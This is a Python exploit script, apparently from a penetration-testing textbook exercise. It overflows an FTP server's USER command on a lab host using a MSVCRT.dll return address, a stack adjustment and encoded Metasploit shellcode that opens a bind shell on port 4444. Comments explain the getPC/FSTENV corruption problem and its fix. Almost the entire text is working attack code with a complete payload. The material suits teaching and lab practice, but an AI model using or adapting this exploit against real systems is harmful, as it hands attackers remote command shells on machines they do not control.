
#!/usr/bin/python
import socket
#shellcode
# msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -b '\x00\x0a\x0d\x40' -e x86/shikata_ga_nai -s 597
# Msfvenom’s encoded shellcode needs to first decode itself before 
#executing, and as part of the decoding process, it needs to find its location in memory using a routine 
#called getPC. A common technique for 
#finding the current location in memory includes using an instruction 
#called FSTENV, which writes a structure onto the stack, overwriting what’s 
#there—in our case part of the shellcode. All we need to do to fix this is 
#move ESP away from the shellcode, so getPC has room to work without 
#corrupting our shellcode. (The problem in general is that if the values in 
#EIP and ESP are too close together, shellcode tends to corrupt itself, either 
#during decoding or during execution.) This is what caused our crash in 
#the previous run. 
#

shellcode = (
"\xda\xd7\xd9\x74\x24\xf4\x58\xbb\xda\x02\x50\xa5\x31\xc9" 
"\xb1\x56\x83\xe8\xfc\x31\x58\x14\x03\x58\xce\xe0\xa5\x59" 
"\x06\x6d\x45\xa2\xd6\x0e\xcf\x47\xe7\x1c\xab\x0c\x55\x91" 
"\xbf\x41\x55\x5a\xed\x71\xee\x2e\x3a\x75\x47\x84\x1c\xb8" 
"\x58\x28\xa1\x16\x9a\x2a\x5d\x65\xce\x8c\x5c\xa6\x03\xcc" 
"\x99\xdb\xeb\x9c\x72\x97\x59\x31\xf6\xe5\x61\x30\xd8\x61" 
"\xd9\x4a\x5d\xb5\xad\xe0\x5c\xe6\x1d\x7e\x16\x1e\x16\xd8" 
"\x87\x1f\xfb\x3a\xfb\x56\x70\x88\x8f\x68\x50\xc0\x70\x5b" 
"\x9c\x8f\x4e\x53\x11\xd1\x97\x54\xc9\xa4\xe3\xa6\x74\xbf" 
"\x37\xd4\xa2\x4a\xaa\x7e\x21\xec\x0e\x7e\xe6\x6b\xc4\x8c" 
"\x43\xff\x82\x90\x52\x2c\xb9\xad\xdf\xd3\x6e\x24\x9b\xf7" 
"\xaa\x6c\x78\x99\xeb\xc8\x2f\xa6\xec\xb5\x90\x02\x66\x57" 
"\xc5\x35\x25\x30\x2a\x08\xd6\xc0\x24\x1b\xa5\xf2\xeb\xb7" 
"\x21\xbf\x64\x1e\xb5\xc0\x5f\xe6\x29\x3f\x5f\x17\x63\x84" 
"\x0b\x47\x1b\x2d\x33\x0c\xdb\xd2\xe6\x83\x8b\x7c\x58\x64" 
"\x7c\x3d\x08\x0c\x96\xb2\x77\x2c\x99\x18\x0e\x6a\x57\x78" 
"\x43\x1d\x9a\x7e\x72\x81\x13\x98\x1e\x29\x72\x32\xb6\x8b" 
"\xa1\x8b\x21\xf3\x83\xa7\xfa\x63\x9b\xa1\x3c\x8b\x1c\xe4" 
"\x6f\x20\xb4\x6f\xfb\x2a\x01\x91\xfc\x66\x21\xd8\xc5\xe1" 
"\xbb\xb4\x84\x90\xbc\x9c\x7e\x30\x2e\x7b\x7e\x3f\x53\xd4" 
"\x29\x68\xa5\x2d\xbf\x84\x9c\x87\xdd\x54\x78\xef\x65\x83" 
"\xb9\xee\x64\x46\x85\xd4\x76\x9e\x06\x51\x22\x4e\x51\x0f" 
"\x9c\x28\x0b\xe1\x76\xe3\xe0\xab\x1e\x72\xcb\x6b\x58\x7b" 
"\x06\x1a\x84\xca\xff\x5b\xbb\xe3\x97\x6b\xc4\x19\x08\x93" 
"\x1f\x9a\x38\xde\x3d\x8b\xd0\x87\xd4\x89\xbc\x37\x03\xcd" 
"\xb8\xbb\xa1\xae\x3e\xa3\xc0\xab\x7b\x63\x39\xc6\x14\x06" 
"\x3d\x75\x14\x03"
)
# pushesp = "\x59\x54\xc3\x77" MSVCRT.dll Penetration
# testing aHands-on introduction to Hacking

buffer = "A" * 485 + "\x59\x54\xc3\x77" + "C" * 4 + "\x81\xc4\x24\xfa\xff\xff" + shellcode
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.128',21))
response = s.recv(1024)
print response
s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)
print response
s.send('PASS PASSWORD\r\n')
s.close()